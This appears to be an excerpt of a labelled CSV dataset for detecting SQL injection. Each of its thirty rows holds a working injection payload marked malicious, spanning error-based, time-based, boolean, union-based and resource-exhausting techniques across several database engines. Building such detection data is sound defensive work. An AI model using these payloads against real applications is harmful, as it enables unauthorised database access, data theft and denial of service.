row_index,payload_norm,label,sqli_type_hint
5640,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) )",1,
5641,"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'dhoo' like 'dhoo",1,
5642,"1,row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",1,
5643,"1' ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
5644,"1', ( select ( case when ( 6750 = 6750 ) then 1 else 6750* ( select 6750 from information_schema.character_sets ) end ) )",1,
5645,"1%' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5646,-9841 where 4612 = 4612 union all select 4612--,1,
5647,"-5161%"" or ( 1437 = 4869 ) *4869 and ""%"" = """,1,
5648,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'lmoh' like 'lmoh",1,
5649,1 ) where 6950 = 6950 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
5650,"1"" ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
5651,"-6595"" order by 1--",1,
5652,select sleep ( 5 ) and 'beuk' = 'beuk,1,
5653,"1%"" ) union all select null,null,null,null,null--",1,
5654,"-2178' ) ) ) or elt ( 3421 = 2899,2899 ) and ( ( ( 'jdst' = 'jdst",1,
5655,"1 ) ) ) and elt ( 3132 = 1541,1541 ) and ( ( ( 4258 = 4258",1,
5656,"1%"" ) ) waitfor delay '0:0:5'--",1,
5657,"-2821"" ) ) ) union all select 3920,3920,3920,3920,3920,3920,3920#",1,
5658,"1%' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( '%' = '",1,
5659,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'akki' = 'akki",1,
5660,"-9966' ) ) union all select 7230,7230,7230,7230,7230,7230,7230#",1,
5661,1' ) where 1183 = 1183,1,
5662,"1' in boolean mode ) union all select null,null,null,null,null,null,null,null--",1,
5663,1' where 5230 = 5230,1,
5664,"1"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""lmjg"" like ""lmjg",1,
5665,1' ) as bzem where 4240 = 4240,1,
5666,select ( case when ( 5423 = 7706 ) then 5423 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
5667,1'|| ( select 'wszt' from dual where 6854 = 6854 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',1,
5668,1 and sleep ( 5 ) # qcyj,1,
5669,"1"" ) ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""lynw"" like ""lynw",1,
